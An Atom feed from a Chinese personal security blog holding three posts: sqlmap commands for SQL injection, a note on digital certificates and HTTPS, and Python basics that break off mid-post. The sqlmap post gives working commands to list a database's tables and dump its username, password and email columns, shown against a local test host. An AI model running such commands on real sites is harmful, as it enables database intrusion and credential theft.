<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Rick7dology</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-03-09T10:07:51.195Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Rick7</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>经典sqlmap命令</title>
    <link href="http://yoursite.com/2018/03/09/%E7%BB%8F%E5%85%B8sqlmap%E5%91%BD%E4%BB%A4/"/>
    <id>http://yoursite.com/2018/03/09/经典sqlmap命令/</id>
    <published>2018-03-09T15:33:21.000Z</published>
    <updated>2018-03-09T10:07:51.195Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-查看当前数据库，得到数据库名字"><a href="#0x01-查看当前数据库，得到数据库名字" class="headerlink" title="0x01 查看当前数据库，得到数据库名字"></a>0x01 查看当前数据库，得到数据库名字</h1><p>sqlmap.py -u “存在注入url” –current-db</p><p>python sqlmap.py -u “<a href="http://127.0.0.1:65412/?id=2" target="_blank" rel="noopener">http://127.0.0.1:65412/?id=2</a>“ –current-db</p><h1 id="0x02-查看tables-得到指定数据库的表名字"><a href="#0x02-查看tables-得到指定数据库的表名字" class="headerlink" title="0x02 查看tables,得到指定数据库的表名字"></a>0x02 查看tables,得到指定数据库的表名字</h1><p>python sqlmap.py -u “存在注入url” -D “当前数据库名” –tables   //解释说明：-D是指定数据库名称</p><p>python sqlmap.py -u “<a href="http://127.0.0.1:65412/?id=2" target="_blank" rel="noopener">http://127.0.0.1:65412/?id=2</a>“ –tables</p><h1 id="0x03-查看columns，得到指定数据库，指定表的列名字"><a href="#0x03-查看columns，得到指定数据库，指定表的列名字" class="headerlink" title="0x03 查看columns，得到指定数据库，指定表的列名字"></a>0x03 查看columns，得到指定数据库，指定表的列名字</h1><p>sqlmap.py -u “存在注入url” -D “当前数据库名” -T “数据库中的随意一张表(选取表需要自己判断)” –columns</p><p>python sqlmap.py -u “<a href="http://127.0.0.1:65412/?id=2" target="_blank" rel="noopener">http://127.0.0.1:65412/?id=2</a>“ -T “users” –columns</p><h1 id="0x04-根据上面得到的columns查看具体字段"><a href="#0x04-根据上面得到的columns查看具体字段" class="headerlink" title="0x04 根据上面得到的columns查看具体字段"></a>0x04 根据上面得到的columns查看具体字段</h1><p>sqlmap.py -u “存在注入url ” -D “当前数据库名” -T “数据库中的随意一张表(选取表需要自己判断)” -C “username,password,email” –dump</p><p>python sqlmap.py -u “<a href="http://127.0.0.1:65412/?id=2" target="_blank" rel="noopener">http://127.0.0.1:65412/?id=2</a>“ -T “users” -C “password” –dump</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x01-查看当前数据库，得到数据库名字&quot;&gt;&lt;a href=&quot;#0x01-查看当前数据库，得到数据库名字&quot; class=&quot;headerlink&quot; title=&quot;0x01 查看当前数据库，得到数据库名字&quot;&gt;&lt;/a&gt;0x01 查看当前数据库，得到数据库名字&lt;/h1&gt;&lt;
      
    
    </summary>
    
    
      <category term="Web security" scheme="http://yoursite.com/tags/Web-security/"/>
    
  </entry>
  
  <entry>
    <title>数字证书的理解</title>
    <link href="http://yoursite.com/2018/03/07/%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E7%9A%84%E7%90%86%E8%A7%A3/"/>
    <id>http://yoursite.com/2018/03/07/数字证书的理解/</id>
    <published>2018-03-07T11:27:18.000Z</published>
    <updated>2018-03-10T07:36:08.077Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>数字证书是公钥密码学的典型应用，是信息安全的基础，今日好好复习一下</p><h1 id="0x01-简单应用原理"><a href="#0x01-简单应用原理" class="headerlink" title="0x01 简单应用原理"></a>0x01 简单应用原理</h1><p><strong>最重要的一点，数字证书是保障公钥的可靠性</strong></p><p>以下流程参考阮一峰老师的经典流程：</p><p>假设A给B写一份信。</p><p>那么这封将包含如下三部分内容：</p><p>1.信本身的内容（直接可以看到，未加密）</p><p>2.A的数字签名 （是由信本身的内容经过hash算法计算得到digest摘要，然后用 A的私钥 加密而来的）</p><p>3.A的数字证书 （是A 向数字证书中心（CA）申请的，是由 A的个人信息，A的公钥 等经过CA的私钥 加密而来的）</p><p>然后B先用CA提供的公钥解开数字证书，根据得到的内容，如A的个人信息，确定是A发过来的，然后拿到了A的公钥。</p><p>接着，用A的公钥解开A的数字签名 就能得到信本身内容的摘要。然后将信的第一部分，即信的本身内容 经hash计算得到一个新的摘要，将两个摘要比较，如果相同 说明信的内容没有被篡改。</p><p><strong>这里B要做的就是查询CA是否可信，然后用可信CA的公钥解开A的数字证书，得到A的个人信息和公钥，然后利用A的可信公钥验证A的数字签名，可见，数字证书的最大作用就是保证A的公钥的真实性，抗抵赖</strong></p><h1 id="0x02-Https的应用"><a href="#0x02-Https的应用" class="headerlink" title="0x02 Https的应用"></a>0x02 Https的应用</h1><p>https传输，访问google网站：<br>握手时用非对称加密传输对称加密的密码，数据传输时用对称加密的密码加密数据（对称加密解密速度比非对称加密快）</p><p>过程：</p><ul><li>浏览器发送自己支持的加密规则给google</li><li>google选择一组加密算法和HASH算法，并将自己的数字证书发给浏览器</li><li>浏览器验证数字证书的合法性（验证证书的数字签名），然后生成一个随机数，从google的数字证书里面获取google的公钥，用这个公钥加密随机数。用约定的hash算法生成握手消息的摘要，并用生成的随机数加密摘要。把握手消息、加密的摘要、加密的随机数发给google</li><li>google用自己的私钥解密随机数，然后用随机数解密摘要，再用hash生成收到的握手消息的摘要与解密的摘要对比，验证正确性。</li><li>google一样用hash算法生成握手消息的摘要，并用解密的随机数加密摘要。然后把握手消息、加密的摘要发给浏览器</li><li>浏览器验证摘要成功后，握手完成。之后通信的数据用之前浏览器生成的随机密码加密后传输。</li></ul><h1 id="0x03-问题的根源：-证书中的公钥的真实性和完整性）"><a href="#0x03-问题的根源：-证书中的公钥的真实性和完整性）" class="headerlink" title="0x03 问题的根源：(证书中的公钥的真实性和完整性）"></a>0x03 问题的根源：(证书中的公钥的真实性和完整性）</h1><p>由上面的例子中我们看到，https传输的过程中，Google会发来自己的证书，里面包含了Google的公钥，用户浏览器要使用这个公钥加密消息再发送到Google服务器进行协商，其中，这个公钥的完整性和真实性就是关键，如何保证这个证书里面的公钥真的是Google的呢？这就是为什么要验证证书的数字签名的理由，那么如何验证呢？就是通过CA了，CA会通过自己的私钥对可信的包含正确公钥的Google证书进行数字签名，用户浏览器要使用CA的公钥验证证书的数字签名。</p><h1 id="0x04-证书链"><a href="#0x04-证书链" class="headerlink" title="0x04 证书链"></a>0x04 证书链</h1><p>根据上面的说明，证书的出现是为了保证双方的公钥是合法的，没有被篡改的，那么谁保证证书的合法性和完整呢？那就是CA，但是直接从知名的CA获得签名证书是昂贵的，所以，就出现了由知名CA签发了一个证书A，再又证书A签发证书B的方式，这就是证书链。<br><strong>本质来说，就是顶级CA认证了A的公钥，然后A的公钥再认证B的公钥。</strong> </p><h2 id="证书链的构成："><a href="#证书链的构成：" class="headerlink" title="证书链的构成："></a>证书链的构成：</h2><p>end-user ：baidu.com 包含用来加密传输数据的公钥的证书，是HTTPS中使用的证书</p><p>intermediates CA ：CA用来认证公钥持有者身份的证书，即确认HTTPS使用的end-user证书是属于baidu.com的证书。这类intermediates证书甚至可以有很多级。</p><p>root CA ：用来认证intermediates证书是合法证书的证书。</p><p>简单来说，end-user证书上面几级证书都是为了保证end-user证书未被篡改，保证是CA签发的合法证书，进而保证end-user证书中的公钥未被篡改</p><p><img src="/images/certificate chain.png" alt="证书链图片"></p><h2 id="如何验证证书链"><a href="#如何验证证书链" class="headerlink" title="如何验证证书链"></a>如何验证证书链</h2><p>链式向上验证证书，直到Root Certificates，先验证用intermediates CA 签发的end-user的证书的数字签名，再利用root CA验证intermediates CA的数字签名。下图就是访问百度获得的三张证书</p><p><img src="/images/end-user.png" alt="证书链图片1"><br><img src="/images/intermediates CA.png" alt="证书链图片2"><br><img src="/images/root CA.png" alt="证书链图片3"></p><p>下面的图片很好的表达了如何进行证书链的认证：</p><p><img src="/images/verify.png" alt="证书链图片4"></p><p>从哪获取非根证书的颁发者证书？</p><p>网站的证书里是包含上级颁发机构的证书获取地址的</p><h2 id="总体来说浏览器对证书的验证包括下面几项："><a href="#总体来说浏览器对证书的验证包括下面几项：" class="headerlink" title="总体来说浏览器对证书的验证包括下面几项："></a>总体来说浏览器对证书的验证包括下面几项：</h2><ul><li><p>验证证书是否在有效期内</p></li><li><p>验证证书是否在有效期内</p></li></ul><p>验证吊销有CRL和OCSP两种方法</p><ul><li>验证证书是否是上级CA签发的(上面讨论的重点)</li></ul><h1 id="x-509-证书编码格式"><a href="#x-509-证书编码格式" class="headerlink" title="x.509 证书编码格式"></a>x.509 证书编码格式</h1><p>我们平时会见到一大堆后缀名不同的证书，但先抛开后缀名字不谈，x.509就只有两种常用的编码格式</p><ul><li><p>PEM - Privacy Enhanced Mail,打开看文本格式,以”—–BEGIN…”开头, “—–END…”结尾,内容是BASE64编码.<br>查看PEM格式证书的信息:openssl x509 -in certificate.pem -text -noout<br>Apache和*NIX服务器偏向于使用这种编码格式.</p></li><li><p>DER - Distinguished Encoding Rules,打开看是二进制格式,不可读.<br>查看DER格式证书的信息:openssl x509 -in certificate.der -inform der -text -noout<br>Java和Windows服务器偏向于使用这种编码格式.</p></li></ul><h2 id="相关的文件扩展名-引用一下别人的"><a href="#相关的文件扩展名-引用一下别人的" class="headerlink" title="相关的文件扩展名,引用一下别人的"></a>相关的文件扩展名,引用一下别人的</h2><blockquote><p>这是比较误导人的地方,虽然我们已经知道有PEM和DER这两种编码格式,但文件扩展名并不一定就叫”PEM”或者”DER”,常见的扩展名除了PEM和DER还有以下这些,它们除了编码格式可能不同之外,内容也有差别,但大多数都能相互转换编码格式.</p></blockquote><ul><li><p>CRT - CRT应该是certificate的三个字母,其实还是证书的意思,常见于*NIX系统,有可能是PEM编码,也有可能是DER编码,大多数应该是PEM编码,</p></li><li><p>CER - 还是certificate,还是证书,常见于Windows系统,同样的,可能是PEM编码,也可能是DER编码,大多数应该是DER编码.</p></li><li><p>PFX/P12 - predecessor of PKCS#12,对*nix服务器来说,一般CRT和KEY是分开存放在不同文件中的,但Windows的IIS则将它们存在一个PFX文件中,(因此这个文件包含了证书及私钥)这样会不会不安全？应该不会,PFX通常会有一个”提取密码”,你想把里面的东西读取出来的话,它就要求你提供提取密码,PFX使用的时DER编码,如何把PFX转换为PEM编码？<br>openssl pkcs12 -in for-iis.pfx -out for-iis.pem -nodes<br>这个时候会提示你输入提取代码. for-iis.pem就是可读的文本.<br>生成pfx的命令类似这样:openssl pkcs12 -export -in certificate.crt -inkey privateKey.key -out certificate.pfx -certfile CACert.crt</p></li></ul><p>其中CACert.crt是CA(权威证书颁发机构)的根证书,有的话也通过-certfile参数一起带进去.这么看来,PFX其实是个证书密钥库.</p><p>现在下面的图片就不会再疑惑了，嘿嘿：</p><p><img src="/images/burpencode.png" alt="burpencode"></p><p>参考：</p><p><a href="http://www.ruanyifeng.com/blog/2011/08/what_is_a_digital_signature.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2011/08/what_is_a_digital_signature.html</a></p><p><a href="https://www.jianshu.com/p/46e48bc517d0" target="_blank" rel="noopener">https://www.jianshu.com/p/46e48bc517d0</a></p><p><a href="https://security.stackexchange.com/questions/56389/ssl-certificate-framework-101-how-does-the-browser-actually-verify-the-validity" target="_blank" rel="noopener">https://security.stackexchange.com/questions/56389/ssl-certificate-framework-101-how-does-the-browser-actually-verify-the-validity</a></p><p><a href="https://www.zhihu.com/question/37370216" target="_blank" rel="noopener">https://www.zhihu.com/question/37370216</a></p><p><a href="http://www.cnblogs.com/guogangj/p/4118605.html" target="_blank" rel="noopener">http://www.cnblogs.com/guogangj/p/4118605.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;数字证书是公钥密码学的典型应用，是信息安全的基础，今日好好复习一下&lt;/p&gt;
&lt;h1 id=&quot;0x01
      
    
    </summary>
    
    
      <category term="Web security" scheme="http://yoursite.com/tags/Web-security/"/>
    
  </entry>
  
  <entry>
    <title>Python 常用套路总结_1</title>
    <link href="http://yoursite.com/2018/03/03/Python%20%E5%B8%B8%E7%94%A8%E5%A5%97%E8%B7%AF%E6%80%BB%E7%BB%93-1/"/>
    <id>http://yoursite.com/2018/03/03/Python 常用套路总结-1/</id>
    <published>2018-03-02T16:15:14.000Z</published>
    <updated>2018-03-05T13:47:59.350Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>跟着“菜鸟学Python”这个我最喜欢的公众号文章做点练习和巩固基本套路</p><h1 id="0x01-字符串-string-的使用"><a href="#0x01-字符串-string-的使用" class="headerlink" title="0x01 字符串(string)的使用"></a>0x01 字符串(string)的使用</h1><ul><li>主要复习了字符串分割，字符串列表按长度排序的方法</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">text1=<span class="string">'A dict that contains arbitrary metadata for this request. '</span> \</span><br><span class="line">      <span class="string">'This dict is empty for new Requests, '</span> \</span><br><span class="line">      <span class="string">'and is usually populated by different Scrapy components . '</span> \</span><br><span class="line">      <span class="string">'So the data contained in this dict depends on the extensions you have enabled.'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">text2 = text1.split(<span class="string">' '</span>) <span class="comment">#分割字符串,得到下面的由字符串组成的列表</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#['A', 'dict', 'that', 'contains', 'arbitrary', 'metadata', 'for', 'this', 'request.', 'This', 'dict', 'is', 'empty', 'for', 'new', 'Requests,', 'and', 'is', 'usually', 'populated', 'by', 'different', 'Scrapy', 'components', '.', 'So', 'the', 'data', 'contained', 'in', 'this', 'dict', 'depends', 'on', 'the', 'extensions', 'you', 'have', 'enabled.']</span></span><br><span class="line"></span><br><span class="line">text3 = sorted(text2,key = <span class="keyword">lambda</span> x:len(x),reverse=<span class="keyword">True</span>) <span class="comment">#按分割后的每个字符串长度排序</span></span><br><span class="line"></span><br><span class="line">print(text3[<span class="number">0</span>]) <span class="comment">#得到最长的那个字符串</span></span><br></pre></td></tr></table></figure><ul><li>找单词的长度是5或6，主要复习了列表生成式</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list = [x <span class="keyword">for</span> x <span class="keyword">in</span> text2 <span class="keyword">if</span> <span class="number">6</span>&gt;=len(x)&gt;=<span class="number">5</span>] <span class="comment">#利用列表生成式</span></span><br><span class="line"></span><br><span class="line">print(list)</span><br></pre></td></tr></table></figure><ul><li>统计每个字符串出现的次数，主要复习了Counter类的使用，常用于统计</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter <span class="comment">#统计每个字符串的出现次数</span></span><br><span class="line"></span><br><span class="line">result = dict(Counter(text2))</span><br><span class="line"></span><br><span class="line"><span class="comment">#output:输出字典形式的统计结果</span></span><br><span class="line">&#123;<span class="string">'empty'</span>: <span class="number">1</span>, <span class="string">'metadata'</span>: <span class="number">1</span>, <span class="string">'Scrapy'</span>: <span class="number">1</span>, <span class="string">'by'</span>: <span class="number">1</span>, <span class="string">'dict'</span>: <span class="number">3</span>, <span class="string">'the'</span>: <span class="number">2</span>, <span class="string">'contains'</span>: <span class="number">1</span>, <span class="string">'enabled.'</span>: <span class="number">1</span>, <span class="string">'So'</span>: <span class="number">1</span>, <span class="string">'contained'</span>: <span class="number">1</span>, <span class="string">'.'</span>: <span class="number">1</span>, <span class="string">'is'</span>: <span class="number">2</span>, <span class="string">'in'</span>: <span class="number">1</span>, <span class="string">'new'</span>: <span class="number">1</span>, <span class="string">'that'</span>: <span class="number">1</span>, <span class="string">'components'</span>: <span class="number">1</span>, <span class="string">'Requests,'</span>: <span class="number">1</span>, <span class="string">'different'</span>: <span class="number">1</span>, <span class="string">'This'</span>: <span class="number">1</span>, <span class="string">'depends'</span>: <span class="number">1</span>, <span class="string">'extensions'</span>: <span class="number">1</span>, <span class="string">'on'</span>: <span class="number">1</span>, <span class="string">'and'</span>: <span class="number">1</span>, <span class="string">'you'</span>: <span class="number">1</span>, <span class="string">'this'</span>: <span class="number">2</span>, <span class="string">'request.'</span>: <span class="number">1</span>, <span class="string">'arbitrary'</span>: <span class="number">1</span>, <span class="string">'for'</span>: <span class="number">2</span>, <span class="string">'have'</span>: <span class="number">1</span>, <span class="string">'populated'</span>: <span class="number">1</span>, <span class="string">'A'</span>: <span class="number">1</span>, <span class="string">'usually'</span>: <span class="number">1</span>, <span class="string">'data'</span>: <span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure><ul><li>字符串的拼接, join()函数和字符串拼接符“+”的运用和对比，建议大型拼接用join()</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">names=[<span class="string">'Hello'</span>,<span class="string">' James'</span>,<span class="string">','</span>,<span class="string">' how'</span>,<span class="string">' are'</span>,<span class="string">' you'</span>, <span class="string">'!'</span>]</span><br><span class="line"></span><br><span class="line">print(<span class="string">''</span>.join(names))</span><br><span class="line"></span><br><span class="line">---------------------------</span><br><span class="line">s=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> names:</span><br><span class="line">    s=s+i</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure><h1 id="0x02-字典-dict-的使用"><a href="#0x02-字典-dict-的使用" class="headerlink" title="0x02 字典(dict)的使用"></a>0x02 字典(dict)的使用</h1><ul><li>通过key,value排序，这里需要借助 dict.items() 方法以列表方式返回键值对</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">print(result.items())<span class="comment">#得到由元组组成的列表</span></span><br><span class="line"></span><br><span class="line">dict_items([(<span class="string">'empty'</span>, <span class="number">1</span>), (<span class="string">'metadata'</span>, <span class="number">1</span>), (<span class="string">'Scrapy'</span>, <span class="number">1</span>), (<span class="string">'by'</span>, <span class="number">1</span>), (<span class="string">'dict'</span>, <span class="number">3</span>), (<span class="string">'the'</span>, <span class="number">2</span>), (<span class="string">'contains'</span>, <span class="number">1</span>), (<span class="string">'enabled.'</span>, <span class="number">1</span>), (<span class="string">'So'</span>, <span class="number">1</span>), (<span class="string">'contained'</span>, <span class="number">1</span>), (<span class="string">'.'</span>, <span class="number">1</span>), (<span class="string">'is'</span>, <span class="number">2</span>), (<span class="string">'in'</span>, <span class="number">1</span>), (<span class="string">'new'</span>, <span class="number">1</span>), (<span class="string">'that'</span>, <span class="number">1</span>), (<span class="string">'components'</span>, <span class="number">1</span>), (<span class="string">'Requests,'</span>, <span class="number">1</span>), (<span class="string">'different'</span>, <span class="number">1</span>), (<span class="string">'This'</span>, <span class="number">1</span>), (<span class="string">'depends'</span>, <span class="number">1</span>), (<span class="string">'extensions'</span>, <span class="number">1</span>), (<span class="string">'on'</span>, <span class="number">1</span>), (<span class="string">'and'</span>, <span class="number">1</span>), (<span class="string">'you'</span>, <span class="number">1</span>), (<span class="string">'this'</span>, <span class="number">2</span>), (<span class="string">'request.'</span>, <span class="number">1</span>), (<span class="string">'arbitrary'</span>, <span class="number">1</span>), (<span class="string">'for'</span>, <span class="number">2</span>), (<span class="string">'have'</span>, <span class="number">1</span>), (<span class="string">'populated'</span>, <span class="number">1</span>), (<span class="string">'A'</span>, <span class="number">1</span>), (<span class="string">'usually'</span>, <span class="number">1</span>), (<span class="string">'data'</span>, <span class="number">1</span>)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(sorted(result.items(),key = <span class="keyword">lambda</span> x:x[<span class="number">0</span>],reverse=<span class="keyword">True</span>)) <span class="comment">#以字典的key排序</span></span><br><span class="line"></span><br><span class="line">print(sorted(result.items(),key = <span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="keyword">True</span>)) <span class="comment">#以字典的value排序</span></span><br></pre></td></tr></table></figure><ul><li>有序字典OrderedDict()，按照插入顺序进行输出</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> OrderedDict</span><br><span class="line"></span><br><span class="line">orderdict = OrderedDict() <span class="comment">#按输入的顺序有序输出</span></span><br><span class="line"></span><br><span class="line">orderdict[<span class="string">'a'</span>] = <span class="number">1</span></span><br><span class="line">orderdict[<span class="string">'b'</span>] = <span class="number">2</span></span><br><span class="line">orderdict[<span class="string">'c'</span>] = <span class="number">3</span></span><br><span class="line">orderdict[<span class="string">'d'</span>] = <span class="number">4</span></span><br><span class="line"></span><br><span class="line">print(orderdict)</span><br><span class="line"></span><br><span class="line">dict = &#123;&#125; <span class="comment">#普通字典不能按输入的顺序输出，无序输出</span></span><br><span class="line"></span><br><span class="line">dict[<span class="string">'a'</span>] = <span class="number">1</span></span><br><span class="line">dict[<span class="string">'b'</span>] = <span class="number">2</span></span><br><span class="line">dict[<span class="string">'c'</span>] = <span class="number">3</span></span><br><span class="line">dict[<span class="string">'d'</span>] = <span class="number">4</span></span><br><span class="line"></span><br><span class="line">print(dict)</span><br></pre></td></tr></table></figure><ul><li>字典的取值，建议用get()方法代替传统方法，增加代码健壮性</li></ul><p>传统的取值dict[key],当key不是字典dict的键，会引起异常，但get()当key不存在时会返回空，不会导致程序异常</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict = &#123;&#125;</span><br><span class="line"></span><br><span class="line">dict[<span class="string">'a'</span>] = <span class="number">1</span></span><br><span class="line">dict[<span class="string">'b'</span>] = <span class="number">2</span></span><br><span class="line">dict[<span class="string">'c'</span>] = <span class="number">3</span></span><br><span class="line">dict[<span class="string">'d'</span>] = <span class="number">4</span></span><br><span class="line"></span><br><span class="line">print(dict(<span class="string">'e'</span>)) <span class="comment">#报错，程序终止</span></span><br><span class="line"></span><br><span class="line">print(dict.get(<span class="string">'e'</span>)) <span class="comment">#返回none，程序继续运行</span></span><br><span class="line"></span><br><span class="line">print(dict.get(<span class="string">'e'</span>,<span class="string">'not found'</span>)) <span class="comment">#自定义异常信息，返回not found，程序继续运行</span></span><br></pre></td></tr></table></figure><h1 id="0x03-Python操作集合的三架马车-filter、map-reduce、sorted-zip"><a href="#0x03-Python操作集合的三架马车-filter、map-reduce、sorted-zip" class="headerlink" title="0x03 Python操作集合的三架马车(filter、map/reduce、sorted)+zip()"></a>0x03 Python操作集合的三架马车(filter、map/reduce、sorted)+zip()</h1><ul><li>map()/reduce()</li></ul><p>map()函数接收两个参数，一个是函数，一个是Iterable，map将传入的函数依次作用到序列的每个元素，并把结果作为新的Iterator返回。</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x * x</span><br><span class="line">r = map(f, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>])</span><br><span class="line"></span><br><span class="line">print(r) <span class="comment">#函数返回一个map object，通过遍历得到每个值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> r:</span><br><span class="line">    print(item)</span><br><span class="line">    print(type(item))</span><br><span class="line"></span><br><span class="line">print(list(map(f,[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>])))<span class="comment"># 一句话解决问题</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#output</span></span><br><span class="line">&lt;map object at <span class="number">0x10e7d2d68</span>&gt;</span><br><span class="line"><span class="number">1</span></span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">int</span>'&gt;</span></span><br><span class="line"><span class="class">4</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">int</span>'&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">.......</span></span><br><span class="line"><span class="class"></span></span><br><span class="line">[1, 4, 9, 16, 25, 36, 49, 64, 81]</span><br></pre></td></tr></table></figure><p>reduce()把一个函数作用在一个序列[x1, x2, x3, …]上，这个函数必须接收两个参数，reduce把结果继续和序列的下一个元素做累积计算</p><ul><li>filter()</li></ul><p>和map()类似，filter()也接收一个函数和一个序列。和map()不同的是，filter()把传入的函数依次作用于每个元素，然后根据返回值是True还是False决定保留还是丢弃该元素。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">not_empty</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> s <span class="keyword">and</span> s.strip()</span><br><span class="line"></span><br><span class="line">print(filter(not_empty, [<span class="string">'A'</span>, <span class="string">''</span>, <span class="string">'B'</span>, <span class="keyword">None</span>, <span class="string">'C'</span>, <span class="string">'  '</span>]))</span><br><span class="line"></span><br><span class="line">print(list(filter(not_empty, [<span class="string">'A'</span>, <span class="string">''</span>, <span class="string">'B'</span>, <span class="keyword">None</span>, <span class="string">'C'</span>, <span class="string">'  '</span>])))</span><br><span class="line"></span><br><span class="line"><span class="comment">#output</span></span><br><span class="line"></span><br><span class="line">&lt;filter object at <span class="number">0x100da1cf8</span>&gt; <span class="comment">#返回一个惰性序列</span></span><br><span class="line"></span><br><span class="line">[<span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>]<span class="comment">#用list()函数遍历求解</span></span><br></pre></td></tr></table></figure><ul><li>sorted()</li></ul><p>sorted()函数就可以对list进行排序,此外，sorted()函数也是一个高阶函数，它还可以接收一个key函数来实现自定义的排序</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">L = [(<span class="string">'Bob'</span>, <span class="number">75</span>), (<span class="string">'Adam'</span>, <span class="number">92</span>), (<span class="string">'Bart'</span>, <span class="number">66</span>), (<span class="string">'Lisa'</span>, <span class="number">88</span>)]</span><br><span class="line"></span><br><span class="line">print(sorted(L,key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="keyword">True</span>)) <span class="comment">#对数字又高到低排列</span></span><br><span class="line"></span><br><span class="line">print(sorted(L,key=<span class="keyword">lambda</span> x:str(x[<span class="number">0</span>].lower))) <span class="comment">#对名字进行大小写不敏感排列</span></span><br></pre></td></tr></table></figure><ul><li>zip()</li></ul><p>zip()是 Python 的一个内建函数，它接受一系列可迭代的对象作为参数，将对象中对应的元素打包成一个个tuple（元组），然后返回由这些tuples组成的list（列表）。若传入参数的长度不等，则返回 list 的长度和参数中长度最短的对象相同。利用*号操作符，可以将list unzip（解压）。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">l2 = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>]</span><br><span class="line"></span><br><span class="line">l4 = zip(l1,l2) </span><br><span class="line"></span><br><span class="line">print(l4)<span class="comment">#输出惰性序列</span></span><br><span class="line"></span><br><span class="line">l4 = tuple(zip(l1,l2)) <span class="comment">#使用tuple()函数遍历得到元组</span></span><br><span class="line"></span><br><span class="line">print(l4)</span><br><span class="line"></span><br><span class="line">l5 = dict(l4) <span class="comment">#转化为字典</span></span><br><span class="line"></span><br><span class="line">print(l5)</span><br><span class="line"></span><br><span class="line"><span class="comment">#output</span></span><br><span class="line"></span><br><span class="line">&lt;zip object at <span class="number">0x1078e0848</span>&gt;</span><br><span class="line">((<span class="number">1</span>, <span class="string">'a'</span>), (<span class="number">2</span>, <span class="string">'b'</span>), (<span class="number">3</span>, <span class="string">'c'</span>), (<span class="number">4</span>, <span class="string">'d'</span>))</span><br><span class="line">&#123;<span class="number">1</span>: <span class="string">'a'</span>, <span class="number">2</span>: <span class="string">'b'</span>, <span class="number">3</span>: <span class="string">'c'</span>, <span class="number">4</span>: <span class="string">'d'</span>&#125;</span><br></pre></td></tr></table></figure><h1 id="0x04-枚举-enumerate-–-Python内置函数"><a href="#0x04-枚举-enumerate-–-Python内置函数" class="headerlink" title="0x04 枚举(enumerate) – Python内置函数"></a>0x04 枚举(enumerate) – Python内置函数</h1><p>常常会在别人的代码中看到它的身影,它允许我们遍历数据并自动计数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list = [<span class="string">'apple'</span>, <span class="string">'banana'</span>, <span class="string">'grapes'</span>, <span class="string">'pear'</span>]</span><br><span class="line"><span class="keyword">for</span> c, value <span class="keyword">in</span> enumerate(my_list,<span class="number">1</span>):</span><br><span class="line">    print(c, value)</span><br><span class="line"></span><br><span class="line">print(enumerate(my_list,<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">print(dict(enumerate(my_list,<span class="number">1</span>)))</span><br><span class="line">print(list(enumerate(my_list,<span class="number">1</span>)))</span><br><span class="line">print(tuple(enumerate(my_list,<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#output:</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> apple</span><br><span class="line"><span class="number">2</span> banana</span><br><span class="line"><span class="number">3</span> grapes</span><br><span class="line"><span class="number">4</span> pear</span><br><span class="line">&lt;enumerate object at <span 